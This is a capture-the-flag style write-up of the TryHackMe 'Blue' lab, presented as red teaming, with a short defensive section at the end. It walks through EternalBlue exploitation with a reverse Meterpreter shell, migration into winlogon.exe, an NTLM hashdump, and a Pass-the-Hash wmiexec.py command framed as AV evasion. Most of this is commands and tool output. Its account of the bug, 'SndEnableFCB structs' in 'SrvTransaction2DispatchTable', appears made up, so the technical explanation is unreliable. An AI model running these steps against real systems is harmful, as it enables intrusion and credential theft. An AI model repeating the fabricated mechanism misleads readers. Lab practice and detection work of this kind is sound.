# Beyond the Flags: Red Teaming THM 'Blue', OPSEC, and Bypassing AV with WMIExec

**Platform:** TryHackMe | **Target:** Blue (Windows Server 2012 R2)  
**Focus:** MS17-010 Mechanics, NonPaged Pool Grooming, Process Migration OPSEC, and Fileless Evasion  

While MS17-010 (EternalBlue) is widely considered an "ancient" vulnerability in modern red teaming, treating it merely as a quick flag-capture exercise misses its true value. At its core, EternalBlue remains one of the most instructive case studies in Windows kernel pool corruption, buffer overflows, and post-exploitation operational security (OPSEC).

In this write-up, we look beyond running an exploit module. We will analyze the underlying memory mechanics of MS17-010, execute stable process migration to avoid system crashes, harvest credentials, and contrast noisy disk-based lateral movement with fileless execution vectors to evade Endpoint Detection.

---

## 1. Vulnerability Validation (Reconnaissance Without Noise)

A disciplined operator never fires a kernel-level exploit blind. Because EternalBlue operates within Ring 0 (Kernel space), an unstable or incorrectly targeted payload can easily trigger a Kernel Panic resulting in a Blue Screen of Death (BSOD)—instantly alerting blue teams and disrupting infrastructure.

To validate the SMBv1 implementation without destabilizing the target, we utilize specific Nmap NSE scripts to probe the server's handling of SMB requests:

```bash
$ nmap -Pn -p 445 --script vuln 10.113.136.219
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-08 14:13 EEST
Nmap scan report for 10.113.136.219
Host is up (0.10s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|       servers (ms17-010).
|   
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

The script inspects the SMB dialect negotiation and transaction responses without corrupting memory, confirming that the host is vulnerable to remote code execution via SMBv1.

---

## 2. Exploitation & Memory Corruption Mechanics

The vulnerability lies in how `srv.sys` (the SMB driver) processes large `SndEnableFCB` structs in `SrvTransaction2DispatchTable`. By sending malformed SMBv1 requests, an attacker can trigger a mathematical overflow when calculating buffer sizes, leading to NonPaged Pool corruption.

When executing the exploit via Metasploit, we monitor the allocation sequence closely:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.129.179:4444 
[*] 10.113.136.219:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.113.136.219:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Datacenter 9600 x64 (64-bit)
[*] 10.113.136.219:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.113.136.219:445 - The target is vulnerable.
[*] 10.113.136.219:445 - shellcode size: 1283
[*] 10.113.136.219:445 - numGroomConn: 12
[*] 10.113.136.219:445 - Target OS: Windows Server 2012 R2 Datacenter 9600
[+] 10.113.136.219:445 - got good NT Trans response
[+] 10.113.136.219:445 - got good NT Trans response
[+] 10.113.136.219:445 - SMB1 session setup allocate nonpaged pool success
[+] 10.113.136.219:445 - SMB1 session setup allocate nonpaged pool success
[+] 10.113.136.219:445 - good response status for nx: INVALID_PARAMETER
[+] 10.113.136.219:445 - good response status for nx: INVALID_PARAMETER
[*] Sending stage (248902 bytes) to 10.113.136.219
[*] Meterpreter session 1 opened (192.168.129.179:4444 -> 10.113.136.219:49224) at 2026-08-08 14:16:43 +0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

*_Note: The line `SMB1 session setup allocate nonpaged pool success` marks the precise moment the kernel memory is groomed and allocated, paving the way for arbitrary ring-0 code execution._

Once the NonPaged Pool is groomed, shellcode is injected into the kernel memory space, granting us an initial `NT AUTHORITY\SYSTEM` payload execution.

---

## 3. OPSEC & Process Migration

Obtaining an initial shell is only half the battle; maintaining stability and stealth is paramount. The initial exploit process is injected directly into a temporary thread inside an unstable process context (often `spoolsv.exe` or `lsass.exe` depending on the payload flavor). If the parent service terminates or crashes, the session dies with it.

To secure operational stability and evade detection, we immediately migrate out of the compromised thread into a stable system process that naturally communicates over the network and executes under higher privileges, such as `winlogon.exe` (PID 432).

```text
meterpreter > ps

Process List
============

PID   PPID  Name                    Arch  Session  User                          Path
---   ----  ----                    ----  -------  ----                          ----
0     0     [System Process]
4     0     System                  x64   0
256   4     smss.exe                x64   0
344   336   csrss.exe
396   388   csrss.exe
404   336   wininit.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
432   388   winlogon.exe            x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
492   404   services.exe            x64   0
500   404   lsass.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
560   492   svchost.exe             x64   0        NT AUTHORITY\SYSTEM
588   492   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
...

meterpreter > migrate 432
[*] Migrating from 588 to 432...
[*] Migration completed successfully.
```

**OPSEC Benefit:** Migrating into `winlogon.exe` masks our network traffic behind a legitimate Windows system process and prevents system instability caused by corrupted kernel pool allocations in the initial thread (`spoolsv.exe`, PID 588).

---

## 4. Credential Harvesting

With `NT AUTHORITY\SYSTEM` execution established inside a stable process (`winlogon.exe`), we access the Security Account Manager (SAM) database directly from memory to extract local account NTLM hashes.

```text
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Extracting the NTLM hash for the local `Administrator` account provides us with the material needed to move laterally across the domain using Pass-The-Hash (PtH) techniques, avoiding the need to perform noisy brute-force attacks or plaintext password cracking.

---

## 5. The Climax: Lateral Movement & AV Evasion

Having harvested the Administrator's NTLM hash:
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::`

We test two different lateral movement techniques to evaluate their operational security footprint and AV evasion capabilities.

### Attempt 1: PsExec (Disk Artifacts & Service Creation)
Using traditional `psexec.py` with Pass-The-Hash:
- **How it works:** PsExec connects via SMB (Port 445), uploads an executable payload (e.g., `PSEXESVC.exe`) to the `ADMIN$` share (`%SystemRoot%`), creates a Windows Service via the Service Control Manager (SCM), and executes it.
- **The Result:** **BLOCKED.** Modern Endpoint Protection (Defender/EDR) flags the dropping of binary files onto disk via SMB shares and instantly terminates the created service.

### Attempt 2: WMIExec (Fileless Execution)
To bypass disk-based signatures, we pivot to `wmiexec.py` using Impacket:
- **How it works:** WMIExec executes commands via the Windows Management Instrumentation (WMI) interface over DCOM/RPC (Port 135). It executes commands directly via `cmd.exe` or `powershell.exe` in memory without dropping a binary executable to disk or creating a temporary Windows service.
- **The Result:** **SUCCESS.**

```bash
$ wmiexec.py WORKGROUP/Administrator@10.113.136.219 -hashes aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
win-jo6revnmmmp\administrator
```

By leveraging a purely fileless execution vector, we bypassed endpoint detection mechanisms that rely on file-write indicators (`FileCreate`) on the hard drive.

---

## 6. Defensive Remediation & Detection Engineering

Understanding the attack mechanics allows us to define effective mitigation strategies:

### 1. Hardening & Mitigation
- **Disable SMBv1:** Completely disable SMBv1 across the environment via Group Policy (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`).
- **Patch Management:** Apply Microsoft Security Bulletin **MS17-010**.
- **Restrict RPC/DCOM:** Restrict RPC communication between endpoints to limit lateral movement vectors like WMIExec.

### 2. Detection Engineering
- **Monitor Process Creation (Event ID 4688 / Sysmon Event ID 1):** Flag instances where `WmiPrvSE.exe` spawns command interpreters (`cmd.exe /Q /c ...`) or PowerShell sessions.
- **Network Monitoring:** Detect abnormal inter-workstation traffic over Port 135 (RPC) and Port 445 (SMB) within internal network segments.
